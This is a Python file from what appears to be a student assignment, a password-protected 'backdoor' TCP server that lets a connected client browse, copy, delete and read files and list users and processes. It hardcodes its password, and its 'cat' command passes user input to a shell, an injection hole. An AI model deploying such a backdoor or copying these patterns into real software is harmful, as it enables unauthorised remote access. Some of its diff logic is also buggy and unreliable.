# Names: Steven Leong(T01) and Josh Quines(T03)
# Student Numbers: 10129668 and 10138118

import os
import subprocess
import shutil
import sys
from collections import defaultdict
import socketserver
import socket, threading
import traceback
import hashlib

"""
Begin code taken from the provided Assignment 2 slides
"""

fileList = defaultdict(list)
fileList2 = defaultdict(list)
diffList = defaultdict(list)
hashList1 = defaultdict(str)
hashList2 = defaultdict(str)

class MyTCPHandler(socketserver.BaseRequestHandler):
    CONNECTED = False                   # connection flag
    BUFFER_SIZE = 4096
    PASSWORD = "p4$$w0rD"               # hardcoded password


    # Authentication function
    def handshake(self):      
        self.request.sendall(bytearray("What's the password? \n", "utf-8"))
        # Get User Input
        userInput = self.request.recv(self.BUFFER_SIZE)
        # Check the input
        if len(userInput) == self.BUFFER_SIZE:
            while 1:
                try:  # Error means no more data
                    userInput += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                except:
                    break

        # convert userInput to string 
        # [:-1] removes the newline made when the user presses enter
        attempt = userInput.decode("utf-8")[:-1]
        print("Password entered: " + attempt)

        # compare attempted password with hardcoded password
        if attempt != self.PASSWORD:
            # User Failed Authentication
            self.request.sendall(bytearray("You entered the wrong password. \nTerminating connection. \nBye! \n", "utf-8"))
            return False
        # User Passed Authentication
        print("Correct password used")
        self.request.sendall(bytearray("Access Granted.\n", "utf-8"))
        return True

    def handle(self):
        # Shows server who opened the backdoor program
        print(self.client_address[0] + " is now connected")

        # if client cannot authenticate, disconnect
        if not self.handshake():
            print(self.client_address[0] + " has disconnected")
            self.request.close()
            return

        self.CONNECTED = True

        while self.CONNECTED:
            # Get user input
            data = self.request.recv(self.BUFFER_SIZE)
            # Check the input
            if len(data) == self.BUFFER_SIZE:
                while 1:
                    try: # Error means no more data
                        data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                    except:
                        break
            if len(data) == 0:
                break 
            data = data.decode("utf-8")
            print("%s wrote: %s" % (self.client_address[0], data.strip()))
            self.inputActions(data)

    def inputActions(self, x):
        userInput = x
        
        # Get UserCommand
        userCommand = userInput.split()
        command = userCommand[0]
        
        # GET WORKING DIRECTORY (pwd)
        if command == 'pwd':
            try:
                #Get current working directory
                directory = os.getcwd()
                message = "Current working directory is: " + directory
            except:
                message = "Error: Wrong number of inputs. Correct command is: pwd"

        # CHANGE WORKING DIRECTORY (cd)
        elif command == 'cd':
            try:
                newDir = userCommand[1]
                cdNewDir = os.chdir(newDir)
                message = "Directory changed to: " + str(newDir) + "\n"

            except FileNotFoundError:   # if there is not directory/file with that name
                newDir = userCommand[1]
                message = "Error: Directory or File does not exist: "  + newDir + ""

            except:                     # else if incorrect format is used
                # ----DEBUG----
                #tb = traceback.format_exc()
                #print (tb)
                message = "Error: Incorrect use of \'cd\'. Correct input is: cd <dir>"

        # COPY A FILE (cp <filename> <newFile>)
        elif command == "cp":
            try:
                file1 = userCommand[1]
                file2 = userCommand[2]
                shutil.copy(file1, file2)
                message = "Copied " + str(file1) + " to " + str(file2)
            except FileNotFoundError:
                message = "File to copy not found\n"
            except:
                message = "Error: Wrong usage of \'cp\': Enter cp <filename> <newname>"

        # RENAME A FILE (cp <filname> <newName>)
        elif command == "mv":
            try:
                file1 = userCommand[1]
                renamed = userCommand[2]
                shutil.move(file1, renamed)
                message = str(file1) + " successfully renamed to: " + renamed
            except FileNotFoundError:
                message = "File to rename not found"
            except:
                message = "Error: Wrong usage of \'mv\': Enter mv <filename> <newname>"

        # REMOVE A FILE (rm <filePath><filename>)
        elif command == "rm":
            try:
                file1 = userCommand[1]
                os.remove(file1)
                message = str(file1) + " has been removed"
            except FileNotFoundError:
                message = "Could not find file: " + file1
            except:
                message = "Error: Wrong usage of \'rm\': Enter rm <filepath><filename>"

        # RETURN CONTENTS OF THE FILE (cat)
        elif command == "cat":
            try:
                filename = userCommand[1]
                newCommand = "cat " + filename
                # run command and gather all output in memory
                output = subprocess.run(newCommand, shell=True, stdout=subprocess.PIPE).stdout
                # convert output of the process to string
                message = output.decode('utf-8')
            except FileNotFoundError: 
                message = "Could not find file: " + filename
            except:
                message = "Error: Could not cat"

        # TAKE A SNAPSHOT OF ALL THE FILES IN CURRENT DIRECTORY AND SAVE IT IN MEMORY (snap)
        elif command == "snap":
            try:
                # fileList = defaultdict(list)
                currentDirectory = os.getcwd()
                #self.fileList[currentDirectory] = [f.name for f in os.scandir() if f.is_file()]

                #SAVE SCREENSHOT
                for f in os.scandir():
                    if f.is_file():
                        #Get Filename
                        k = f.name 
                        #Get sha-1 hash
                        
                        FILE_BUFFER = 65536
                        hashFunc = hashlib.sha1()
                        with open(k, 'rb') as toHash:
                            while True:
                                theHash = toHash.read(FILE_BUFFER)
                                if not theHash:
                                    break
                                hashFunc.update(theHash)
                                v = hashFunc.hexdigest()

                        #v = hashlib.md5(with open(k, 'rb').read()).hexdigest
                        fileList[currentDirectory].append(k)
                        hashList1[k] = v                        
                message = "Snapshot of " + str(currentDirectory) + " has been saved"
            except:
                tb = traceback.format_exc()
                print (tb)
                message = "Error: Unable to take screenshot"

        # COMPARE THE CONTENTS OF THE CURRENT DIRECTORY TO THE SAVED SNAPSHOT AND REPORT DIFFERENCES (diff)
        elif command == "diff":
            # fileList2 = defaultdict(list)
            currentDirectory = os.getcwd()
            # Do same thing for snap as fileList2
            try:
                currentDirectory = os.getcwd()
                #SAVE SCREENSHOT FOR NEW DIRECTORY
                for f in os.scandir():
                    if f.is_file():
                        #Get Filename
                        k = f.name 
                        #Get sha-1 hash
                        
                        FILE_BUFFER = 65536
                        hashFunc = hashlib.sha1()
                        with open(k, 'rb') as toHash:
                            while True:
                                theHash = toHash.read(FILE_BUFFER)
                                if not theHash:
                                    break
                                hashFunc.update(theHash)
                                v = hashFunc.hexdigest()
                        fileList2[currentDirectory].append(k)
                        hashList2[k] = v  

                #COMPARE SCREENSHOTS  
                if fileList[currentDirectory] == fileList2[currentDirectory]:
                    message = "The files are the same"
                    #CHECK IF CURRENT FILES ARE MODIFIED
                    for x in fileList[str(currentDirectory)]:
                        print("BEORE COMPARE :" + x)
                        fileHash1 = hashList1[x]
                        fileHash2 = hashList2[x]
                        print("HASH1 BEFORE CHECK: " + str(fileHash1))
                        print("HASH2 BEFORE CHECK: " + str(fileHash2))
                        if fileHash1 != fileHash2:
                            diffList[str(currentDirectory)].append(str(x) + " has been modified")
                            
                            print("HASH1: " + str(fileHash1))
                            print("HASH2: " + str(fileHash2))
                            del hashList2[x]
                    if len(diffList) > 0:
                        message = ("The filenames are the same but these have been modified: \n" + ("\n".join(diffList[currentDirectory])))
                        del diffList[currentDirectory]


                elif len(fileList[currentDirectory]) < 1:
                    message = "Error: Original snapshot does not exist"
                    print (message)
                else:
                    # diffList = defaultdict(list)
                    for x in fileList[str(currentDirectory)]:
                        if x not in fileList2[str(currentDirectory)]:
                            diffList[str(currentDirectory)].append(str(x) + " was deleted")
                            print("first: " + x)
                    for x in fileList2[str(currentDirectory)]:
                        if x not in fileList[str(currentDirectory)]:
                            diffList[str(currentDirectory)].append(str(x) + " was added")
                            print("second: " + x)
                    #CHECK IF CURRENT FILES ARE MODIFIED
                    for x in fileList[str(currentDirectory)]:
                        if x in fileList2[str(currentDirectory)]:
                            print("BEORE COMPARE :" + x)
                            fileHash1 = hashList1[x]
                            fileHash2 = hashList2[x]
                            print("HASH1 BEFORE CHECK: " + str(fileHash1))
                            print("HASH2 BEFORE CHECK: " + str(fileHash2))
                            if fileHash1 != fileHash2:
                                diffList[str(currentDirectory)].append(str(x) + " has been modified")
                                
                                print("HASH1: " + str(fileHash1))
                                print("HASH2: " + str(fileHash2))
                                del hashList2[x]
                                del diffList[currentDirectory]
                    message = "These are the differences:\n\n" + ("\n".join(diffList[currentDirectory]))
                del fileList2[currentDirectory]


            except NameError:
                tb = traceback.format_exc()
                print (tb)
                message = "Error: Original snapshot does not exist"

        elif command == "help":
            
            try:
                if userCommand[1] == "pwd":
                    message = "[pwd] shows your current directory\nUsage: pwd" 
                elif userCommand[1] == "cd":
                    message = "[cd] changes directory. \nUsage: cd <dir>"   
                elif userCommand[1] == "ls":
                    message = "[ls] lists the files and folders in current directory \nUsage: ls"
                elif userCommand[1] == "cp":
                    message = "[cp] copies a file into another file. \nUsage: cp <file1> <file2>"   
                elif userCommand[1] == "mv":
                    message = "[mv] renames a file. \nUsage: mv <filename> <newFilename>"
                elif userCommand[1] == "rm":
                    message = "[rm] removes a file. \nUsage: rm <file>"
                elif userCommand[1] == "cat":
                    message = "[cat] shows contents of a file. \nUsage: cat <file>"
                elif userCommand[1] == "snap":
                    message = "[snap] takes saves a list of files in current directory.\n Usage: snap"
                elif userCommand[1] == "diff":
                    message = "[diff] shows differences of files in current directory with previous snapshot.\n Usage: diff"        
                elif userCommand[1] == "help":
                    message = "You know what it does. Stop asking me"
                elif userCommand[1] == "who":
                    message = "[who] lists user[s] currently logged in"
                elif userCommand[1] == "ps":
                    message = "[ps] shows the currently running programs"
                else:
                    message = "Error: Invalid command. Type \"help\" for available commands"
            except:
                helpMessage = "\n".join([
                    "---------------------------------",
                    "HERE ARE THE COMMANDS YOU CAN USE",
                    "---------------------------------",
                    "pwd",
                    "cd <dir>",
                    "ls",
                    "cp <file1> <file2>",
                    "mv <filename> <newFilename>",
                    "rm <file>",
                    "cat <file>",
                    "snap",
                    "diff",
                    "help [cmd]: where cmd = one of the commands",
                    "logout",
                    "off",
                    "who",
                    "ps\n",
                    ])
                message = helpMessage 

        # DISCONNECTS CLIENT (SERVER CLOSES THE SOCKET) (logout)
        elif command == "logout":
            # terminate connection
            print("Connection was closed")
            self.request.sendall(bytearray("Logging Out... Bye!\n", "utf -8"))
            self.CONNECTED = False
            self.request.close()
            return
        
        # TERMINATES THE BACKDOOR PROGRAM (off)
        elif command == "off":
            self.request.sendall(bytearray("Terminating the backdoor\n", "utf -8"))
            print("Backdoor has been terminated by the " + self.client_address[0])
            self.CONNECTED = False
            self.request.close()
            sys.exit()

        # LIST FILES AND FOLDERS IN CURRENT DIRECTORY (ls)
        # LIST USER[S] CURRENTLY LOGGED IN (who)
        # SHOW CURRENTLY RUNNING PROCESSES (ps)
        elif command in ("ls", "who", "ps"):
            try:
                if len(userCommand) == 1:
                    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE).stdout
                    # output = subprocess.check_output(command)
                    # convert output of the process to string
                    message = output.decode("utf-8")
                else:
                    message = "Error: Wrong usage of \'" + command + "\': Command does not accept parameters"
            except:
                if command == "ls":
                    message = "Error: Unable to list files and directories"
                elif command == "who":
                    message = "Error: Unable to list user[s] currently logged in"
                elif command == "ps":
                    message = "Error: Unable to show currently running processes"

        else:
            message = "Error: Command not recognized. \n\nType \'help\' to see available commands" 

        #print(message)
        self.request.sendall(bytearray(message + "\n\n", "utf -8"))
        #return message

if __name__ == "__main__":
    HOST = "localhost"
    if len(sys.argv) > 1:
        PORT = int(sys.argv[1])
    else:
        print("Port number not specified.")
        print("Usage: python3 A2.py <port>\n")
        sys.exit()

    try:
        server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
        print("Listening to PORT: " + str(PORT))

        server.serve_forever()

    except Exception as e:
        print("An error occured: " + str(e))
        sys.exit()
"""
End code taken from the provided Assignment 2 slides 
"""

